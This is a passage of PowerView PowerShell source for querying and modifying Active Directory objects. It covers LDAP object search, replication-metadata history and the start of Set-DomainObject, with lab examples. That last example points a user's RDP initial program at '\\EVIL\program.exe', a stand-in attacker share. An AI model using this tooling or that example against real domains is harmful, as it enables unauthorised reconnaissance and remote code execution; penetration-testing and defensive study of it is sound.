            $Results | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        # return raw result objects
                        $Computer = $_
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $Computer = Convert-LDAPProperty -Properties $_.Properties
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $Computer
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainComputer] Error disposing of the Results object: $_"
                }
            }
            $CompSearcher.dispose()
        }
    }
}


function Get-DomainObject {
<#
.SYNOPSIS

Return all (or specified) domain objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-ADName  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from $UACEnum, including
"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainObject -Domain testlab.local

Return all objects for the testlab.local domain

.EXAMPLE

'S-1-5-21-890171859-3433809279-3366196753-1003', 'CN=dfm,CN=Users,DC=testlab,DC=local','b6a9a2fb-bbd5-4f28-9a09-23213cea6693','dfm.a' | Get-DomainObject -Properties distinguishedname

distinguishedname
-----------------
CN=PRIMARY,OU=Domain Controllers,DC=testlab,DC=local
CN=dfm,CN=Users,DC=testlab,DC=local
OU=OU3,DC=testlab,DC=local
CN=dfm (admin),CN=Users,DC=testlab,DC=local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainObject -Credential $Cred -Identity 'windows1'

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

'testlab\harmj0y','DEV\Domain Admins' | Get-DomainObject -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainUser] Extracted domain 'testlab.local' from 'testlab\harmj0y'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=harmj0y)))

distinguishedname
-----------------
CN=harmj0y,CN=Users,DC=testlab,DC=local
VERBOSE: [Get-DomainUser] Extracted domain 'dev.testlab.local' from 'DEV\Domain Admins'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=Domain Admins)))
CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local

.OUTPUTS

PowerView.ADObject

Custom PSObject with translated AD object property fields.

PowerView.ADObject.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # add in the negations
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($ObjectSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^(CN|OU|DC)=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObject] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $ObjectSearcher) {
                            Write-Warning "[Get-DomainObject] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $ObjectDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $ObjectName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$ObjectName)"
                        $SearcherArguments['Domain'] = $ObjectDomain
                        Write-Verbose "[Get-DomainObject] Extracted domain '$ObjectDomain' from '$IdentityInstance'"
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainObject] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            # build the LDAP filter for the dynamic UAC filter value
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if ($Filter -and $Filter -ne '') {
                $ObjectSearcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $ObjectSearcher.FindOne() }
            else { $Results = $ObjectSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = Convert-LDAPProperty -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainObject] Error disposing of the Results object: $_"
                }
            }
            $ObjectSearcher.dispose()
        }
    }
}


function Get-DomainObjectAttributeHistory {
<#
.SYNOPSIS

Returns the Active Directory attribute replication metadata for the specified
object, i.e. a parsed version of the msds-replattributemetadata attribute.
By default, replication data for every domain object is returned.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject

.DESCRIPTION

Wraps Get-DomainObject with a specification to retrieve the property 'msds-replattributemetadata'.
This is the domain attribute replication metadata associated with the object. The results are
parsed from their XML string form and returned as a custom object.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Only return replication metadata on the specified property names.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectAttributeHistory -Domain testlab.local

Return all attribute replication metadata for all objects in the testlab.local domain.

.EXAMPLE

'S-1-5-21-883232822-274137685-4173207997-1109','CN=dfm.a,CN=Users,DC=testlab,DC=local','da','94299db1-e3e7-48f9-845b-3bffef8bedbb' | Get-DomainObjectAttributeHistory -Properties objectClass | ft

ObjectDN      ObjectGuid    AttributeNam LastOriginat Version      LastOriginat
                            e            ingChange                 ingDsaDN
--------      ----------    ------------ ------------ -------      ------------
CN=dfm.a,C... a6263874-f... objectClass  2017-03-0... 1            CN=NTDS S...
CN=DA,CN=U... 77b56df4-f... objectClass  2017-04-1... 1            CN=NTDS S...
CN=harmj0y... 94299db1-e... objectClass  2017-03-0... 1            CN=NTDS S...

.EXAMPLE

Get-DomainObjectAttributeHistory harmj0y -Properties userAccountControl

ObjectDN              : CN=harmj0y,CN=Users,DC=testlab,DC=local
ObjectGuid            : 94299db1-e3e7-48f9-845b-3bffef8bedbb
AttributeName         : userAccountControl
LastOriginatingChange : 2017-03-07T19:56:27Z
Version               : 4
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.OUTPUTS

PowerView.ADObjectAttributeHistory

Custom PSObject with translated replication metadata fields.

.LINK

https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-1-when-did-the-delegation-change-how-to-track-security-descriptor-modifications/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['FindOne']) { $SearcherArguments['FindOne'] = $FindOne }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Properties']) {
            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties['distinguishedname'][0]
            ForEach($XMLNode in $_.Properties['msds-replattributemetadata']) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN
                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion
                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $Output
                    }
                }
                else {
                    Write-Verbose "[Get-DomainObjectAttributeHistory] Error retrieving 'msds-replattributemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function Get-DomainObjectLinkedAttributeHistory {
<#
.SYNOPSIS

Returns the Active Directory links attribute value replication metadata for the
specified object, i.e. a parsed version of the msds-replvaluemetadata attribute.
By default, replication data for every domain object is returned.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject

.DESCRIPTION

Wraps Get-DomainObject with a specification to retrieve the property 'msds-replvaluemetadata'.
This is the domain linked attribute value replication metadata associated with the object. The
results are parsed from their XML string form and returned as a custom object.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Only return replication metadata on the specified property names.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectLinkedAttributeHistory | Group-Object ObjectDN | ft -a

Count Name
----- ----
    4 CN=Administrators,CN=Builtin,DC=testlab,DC=local
    4 CN=Users,CN=Builtin,DC=testlab,DC=local
    2 CN=Guests,CN=Builtin,DC=testlab,DC=local
    1 CN=IIS_IUSRS,CN=Builtin,DC=testlab,DC=local
    1 CN=Schema Admins,CN=Users,DC=testlab,DC=local
    1 CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
    4 CN=Domain Admins,CN=Users,DC=testlab,DC=local
    1 CN=Group Policy Creator Owners,CN=Users,DC=testlab,DC=local
    1 CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=testlab,DC=local
    1 CN=Windows Authorization Access Group,CN=Builtin,DC=testlab,DC=local
    8 CN=Denied RODC Password Replication Group,CN=Users,DC=testlab,DC=local
    2 CN=PRIMARY,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,...
    1 CN=Domain System Volume,CN=DFSR-LocalSettings,CN=PRIMARY,OU=Domain Con...
    1 CN=ServerAdmins,CN=Users,DC=testlab,DC=local
    3 CN=DomainLocalGroup,CN=Users,DC=testlab,DC=local


.EXAMPLE

'S-1-5-21-883232822-274137685-4173207997-519','af94f49e-61a5-4f7d-a17c-d80fb16a5220' | Get-DomainObjectLinkedAttributeHistory

ObjectDN              : CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
ObjectGuid            : 94e782c1-16a1-400b-a7d0-1126038c6387
AttributeName         : member
AttributeValue        : CN=Administrator,CN=Users,DC=testlab,DC=local
TimeDeleted           : 2017-03-06T00:48:29Z
TimeCreated           : 2017-03-06T00:48:29Z
LastOriginatingChange : 2017-03-06T00:48:29Z
Version               : 1
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

ObjectDN              : CN=Domain Admins,CN=Users,DC=testlab,DC=local
ObjectGuid            : af94f49e-61a5-4f7d-a17c-d80fb16a5220
AttributeName         : member
AttributeValue        : CN=dfm,CN=Users,DC=testlab,DC=local
TimeDeleted           : 2017-06-13T22:20:02Z
TimeCreated           : 2017-06-13T22:20:02Z
LastOriginatingChange : 2017-06-13T22:20:22Z
Version               : 2
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

ObjectDN              : CN=Domain Admins,CN=Users,DC=testlab,DC=local
ObjectGuid            : af94f49e-61a5-4f7d-a17c-d80fb16a5220
AttributeName         : member
AttributeValue        : CN=Administrator,CN=Users,DC=testlab,DC=local
TimeDeleted           : 2017-03-06T00:48:29Z
TimeCreated           : 2017-03-06T00:48:29Z
LastOriginatingChange : 2017-03-06T00:48:29Z
Version               : 1
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.EXAMPLE

Get-DomainObjectLinkedAttributeHistory ServerAdmins -Domain testlab.local

ObjectDN              : CN=ServerAdmins,CN=Users,DC=testlab,DC=local
ObjectGuid            : 603b46ad-555c-49b3-8745-c0718febefc2
AttributeName         : member
AttributeValue        : CN=jason.a,CN=Users,DC=dev,DC=testlab,DC=local
TimeDeleted           : 2017-04-10T22:17:19Z
TimeCreated           : 2017-04-10T22:17:19Z
LastOriginatingChange : 2017-04-10T22:17:19Z
Version               : 1
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.OUTPUTS

PowerView.ADObjectLinkedAttributeHistory

Custom PSObject with translated replication metadata fields.

.LINK

https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Properties']) {
            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties['distinguishedname'][0]
            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN
                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty 'AttributeValue' $TempObject.pszObjectDn
                        $Output | Add-Member NoteProperty 'TimeCreated' $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion
                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $Output
                    }
                }
                else {
                    Write-Verbose "[Get-DomainObjectLinkedAttributeHistory] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function Set-DomainObject {
<#
.SYNOPSIS

Modifies a gven property for a specified active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

Splats user/object targeting parameters to Get-DomainObject, returning the raw
searchresult object. Retrieves the raw directoryentry for the object, and sets
any values from -Set @{}, XORs any values from -XOR @{}, and clears any values
from -Clear @().

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Set

Specifies values for one or more object properties (in the form of a hashtable) that will replace the current values.

.PARAMETER XOR

Specifies values for one or more object properties (in the form of a hashtable) that will XOR the current values.

.PARAMETER Clear

Specifies an array of object properties that will be cleared in the directory.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
